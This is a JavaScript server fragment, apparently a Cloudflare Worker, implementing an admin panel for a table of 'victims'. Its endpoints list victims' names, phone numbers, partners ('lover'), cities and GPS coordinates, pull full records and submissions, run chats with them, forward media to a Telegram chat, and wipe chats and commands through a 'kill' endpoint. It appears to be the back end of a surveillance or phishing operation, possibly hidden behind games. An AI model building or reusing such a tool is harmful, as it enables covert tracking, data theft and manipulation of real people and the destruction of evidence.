      const total = await env.DB.prepare("SELECT COUNT(*) as c FROM victims").first();
      const online = await env.DB.prepare("SELECT COUNT(*) as c FROM online_users WHERE last_ping > datetime('now','-3 minutes')").first();
      const phones = await env.DB.prepare("SELECT COUNT(*) as c FROM victims WHERE phone IS NOT NULL AND phone != ''").first();
      const subs = await env.DB.prepare("SELECT COUNT(*) as c FROM submissions").first();
      return json({ total: total.c, online: online.c, phones: phones.c, submissions: subs.c });
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  if (path === "/admin/users-list") {
    try {
      const rows = await env.DB.prepare("SELECT v.sid, v.name, v.phone, v.lover, v.city, v.last_seen, v.visits, s.chat_enabled FROM victims v LEFT JOIN user_settings s ON v.sid = s.sid ORDER BY v.last_seen DESC LIMIT 200").all();
      return json({ users: rows.results });
    } catch(e) { return json({ users: [], err: String(e) }); }
  }

  if (path === "/admin/user-detail") {
    try {
      const sid = u.searchParams.get("sid") || "";
      const v = await env.DB.prepare("SELECT * FROM victims WHERE sid = ?").bind(sid).first();
      const f = await env.DB.prepare("SELECT * FROM user_full WHERE sid = ?").bind(sid).first();
      const s = await env.DB.prepare("SELECT * FROM submissions WHERE sid = ? ORDER BY at DESC LIMIT 50").bind(sid).all();
      const c = await env.DB.prepare("SELECT sid FROM chat_credentials WHERE sid = ?").bind(sid).first();
      return json({ victim: v, full: f, submissions: s.results, has_pass: !!c });
    } catch(e) { return json({ err: String(e) }, 500); }
  }

  if (path === "/admin/chat-toggle" && r.method === "POST") {
    try {
      const b = await r.json();
      const ex = await env.DB.prepare("SELECT sid FROM user_settings WHERE sid = ?").bind(b.sid).first();
      if (ex) await env.DB.prepare("UPDATE user_settings SET chat_enabled = ?, updated_at = CURRENT_TIMESTAMP WHERE sid = ?").bind(b.enabled ? 1 : 0, b.sid).run();
      else await env.DB.prepare("INSERT INTO user_settings (sid, chat_enabled) VALUES (?, ?)").bind(b.sid, b.enabled ? 1 : 0).run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false, err: String(e) }); }
  }

  if (path === "/admin/set-chat-password" && r.method === "POST") {
    try {
      const b = await r.json();
      const pass = String(b.password || "").slice(0, 20);
      const hash = await hashPass(pass, b.sid);
      const ex = await env.DB.prepare("SELECT sid FROM chat_credentials WHERE sid = ?").bind(b.sid).first();
      if (ex) await env.DB.prepare("UPDATE chat_credentials SET chat_password_hash = ? WHERE sid = ?").bind(hash, b.sid).run();
      else await env.DB.prepare("INSERT INTO chat_credentials (sid, chat_password_hash) VALUES (?, ?)").bind(b.sid, hash).run();
      return json({ ok: true, password: pass });
    } catch(e) { return json({ ok: false, err: String(e) }); }
  }

  if (path === "/admin/chat-send" && r.method === "POST") {
    try {
      const b = await r.json();
      const content = String(b.content || "").slice(0, 2000);
      await env.DB.prepare("INSERT INTO chats (sid, from_who, type, content) VALUES (?, 'admin', 'text', ?)").bind(b.sid, content).run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false }); }
  }

  if (path === "/admin/chat-send-media" && r.method === "POST") {
    try {
      const b = await r.json();
      const bin = base64ToBytes(b.data);
      if (bin.length > 5_000_000) return json({ err: "big" }, 413);
      let mime, field, name, method;
      if (b.type === "photo") { mime="image/jpeg"; field="photo"; name="p.jpg"; method="sendPhoto"; }
      else if (b.type === "video") { mime="video/webm"; field="video"; name="v.webm"; method="sendVideo"; }
      else { mime="audio/webm"; field="audio"; name="a.webm"; method="sendAudio"; }
      const f = new FormData();
      f.append("chat_id", env.TG_CHAT);
      f.append("caption", "💬 [ادمین→" + b.sid + "]");
      f.append(field, new Blob([bin], { type: mime }), name);
      const t = await tgSend(env, method, { method: "POST", body: f });
      const tgRes = await t.json();
      let fileId = "";
      if (tgRes.ok && tgRes.result) {
        fileId = tgRes.result.photo ? tgRes.result.photo[tgRes.result.photo.length-1].file_id
               : tgRes.result.video ? tgRes.result.video.file_id
               : tgRes.result.audio ? tgRes.result.audio.file_id : "";
      }
      await env.DB.prepare("INSERT INTO chats (sid, from_who, type, content) VALUES (?, 'admin', ?, ?)").bind(b.sid, b.type, fileId || "[media]").run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false, err: String(e) }); }
  }

  if (path === "/admin/chat-history") {
    try {
      const sid = u.searchParams.get("sid") || "";
      const after = parseInt(u.searchParams.get("after") || "0");
      const rows = await env.DB.prepare("SELECT id, from_who, type, content, at FROM chats WHERE sid = ? AND id > ? ORDER BY id ASC LIMIT 100").bind(sid, after).all();
      return json({ msgs: rows.results });
    } catch(e) { return json({ msgs: [] }); }
  }

  if (path === "/admin/new-messages") {
    try {
      const last = parseInt(u.searchParams.get("last") || "0");
      const r2 = await env.DB.prepare("SELECT COUNT(*) as c FROM chats WHERE from_who = 'user' AND id > ?").bind(last).first();
      const lastRow = await env.DB.prepare("SELECT id FROM chats WHERE from_who = 'user' ORDER BY id DESC LIMIT 1").first();
      return json({ count: r2.c, last_id: lastRow ? lastRow.id : 0 });
    } catch(e) { return json({ count: 0, last_id: 0 }); }
  }

  if (path === "/admin/locations") {
    try {
      const rows = await env.DB.prepare("SELECT sid, name, phone, lat, lng, country, city FROM victims WHERE lat IS NOT NULL AND lng IS NOT NULL ORDER BY last_seen DESC LIMIT 200").all();
      return json({ users: rows.results });
    } catch(e) { return json({ users: [] }); }
  }

  if (path === "/admin/stats-chart") {
    try {
      const days = await env.DB.prepare("SELECT date(first_seen) as d, COUNT(*) as c FROM victims WHERE first_seen > datetime('now', '-14 days') GROUP BY date(first_seen) ORDER BY d ASC").all();
      const countries = await env.DB.prepare("SELECT country, COUNT(*) as c FROM victims WHERE country IS NOT NULL AND country != '' GROUP BY country ORDER BY c DESC LIMIT 8").all();
      return json({ days: days.results.map(x => x.d), counts: days.results.map(x => x.c), countries: countries.results });
    } catch(e) { return json({ days: [], counts: [], countries: [] }); }
  }

  if (path === "/admin/games-chart") {
    try {
      const rows = await env.DB.prepare("SELECT game, COUNT(*) as c FROM game_stats GROUP BY game ORDER BY c DESC").all();
      return json({ games: rows.results });
    } catch(e) { return json({ games: [] }); }
  }

  if (path === "/admin/kill" && r.method === "POST") {
    try {
      await env.DB.prepare("DELETE FROM online_users").run();
      await env.DB.prepare("DELETE FROM chats").run();
      await env.DB.prepare("DELETE FROM commands").run();
      return json({ ok: true });
    } catch(e) { return json({ ok: false }); }
  }

  return new Response("Not Found", { status: 404 });
}

